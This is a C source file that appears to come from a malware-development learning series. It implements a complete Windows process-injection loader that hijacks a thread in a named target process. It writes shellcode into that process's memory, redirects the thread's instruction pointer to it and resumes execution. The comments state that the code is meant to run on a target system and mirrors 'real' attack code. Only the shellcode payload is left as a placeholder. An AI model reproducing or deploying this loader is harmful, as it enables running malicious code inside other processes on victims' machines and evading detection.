// base example of shellcode execution via thread hijacking 
// NOTE as opposed to earlier, simpler scripts I no longer include error-handling
// I included it earlier to assist with any debugging
// but obvs since the intention is to run on a target system, error handling/messaging makes no sense
// so this is more approximating what the "real" code would look like

#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32.lib")

// SHELLCODE
unsigned char shellcode[] = { /* insert shellcode here */ };
unsigned int shellcodeSize = sizeof(shellcode);

// Function to find the process ID of the target process
int findTargetProcessId(const char *processName) {
    int processId = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = {0};
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    Process32First(snapshot, &processEntry);
    while (Process32Next(snapshot, &processEntry)) {
        if (lstrcmpiA(processName, processEntry.szExeFile) == 0) {
            processId = processEntry.th32ProcessID;
            break;
        }
    }
    CloseHandle(snapshot);
    return processId;
}

// THIS FUNCTION FINDS A THREAD IN TARGET PROCESS
// NOTE IT WILL LITERALLY JUST USE FIRST THREAD IT CAN FIND, NO SPECIFIC CRITERIA

HANDLE findTargetThread(int processId) {
    HANDLE threadHandle = NULL;
    THREADENTRY32 threadEntry = {0};
    threadEntry.dwSize = sizeof(threadEntry);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    Thread32First(snapshot, &threadEntry);
    do {
        if (threadEntry.th32OwnerProcessID == processId) {
            threadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
            if (threadHandle != NULL) {
                break;
            }
        }
    } while (Thread32Next(snapshot, &threadEntry));
    CloseHandle(snapshot);
    return threadHandle;
}

// Function to inject code into a remote process
void injectShellcode(int processId, HANDLE processHandle, unsigned char* shellcode, unsigned int shellcodeSize) {

	// AS ALWAYS START WITH CREATING EMPTY BUFFER
    LPVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READ);

    // INJECT SHELLCODE INTO NEW EMPTY BUFFER
    WriteProcessMemory(processHandle, remoteBuffer, (PVOID)shellcode, shellcodeSize, NULL);

    // CALL ON OUR 3RD CUSTOM FUNCTION THAT WILL FIND THE FIRST THREAD IT CAN IN TARGET PROCESS
    HANDLE threadHandle = findTargetThread(processId);

    // NOW THAT WE FOUND A THREAD WE SUSPEND IT
    SuspendThread(threadHandle);

    // WE INDICATE WE ARE INTERESTED IN ALL THE REGISTERS (CONTEXT_FULL) IN CONTEXT
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;

    // WE RETRIEVE CURRENT CONTEXT OF THREAD AND ASSIGN IT TO OUR NEW VARIABLE context
    GetThreadContext(threadHandle, &context);

    // DEPENDING ON ARCHITECTURE WE EITHER REWRITE EIP (32-BIT) OR RIP (64-BIT)
    // LAST LINE ALWAYS EXECUTES -> WE REPLACE ORIGINAL THREAD CONTEXT WITH context WITH NEW INSTRUCTION POINTER
    #ifdef _M_IX86
        context.Eip = (DWORD_PTR)remoteBuffer;
    #else
        context.Rip = (DWORD_PTR)remoteBuffer;
    #endif
    SetThreadContext(threadHandle, &context);

    // ONLY THING LEFT TO DO THEN IS CONTINUE THREAD, SHELLCODE SHOULD NOW EXECUTE
    ResumeThread(threadHandle);
    CloseHandle(threadHandle);
}

int main(int argc, char *argv[]) {

	// we specify target process as CLA, here checks
    if (argc != 2) {
        return 1;
    }

    // we use custom function to find PID for target process
    int processId = findTargetProcessId(argv[1]);

    if (processId == 0) {
        return 1;
    }

    // OPEN HANDLE TO TARGET PROCESS
    HANDLE processHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                                       PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                                       FALSE, (DWORD)processId);
    if (processHandle == NULL) {
        return 1;
    }

    // WE CALL OUR CUSTOM FUNCTION RESPONSIBLE FOR THREAD HIJACKING
    injectShellcode(processId, processHandle, shellcode, shellcodeSize);

    CloseHandle(processHandle);
    return 0;
}



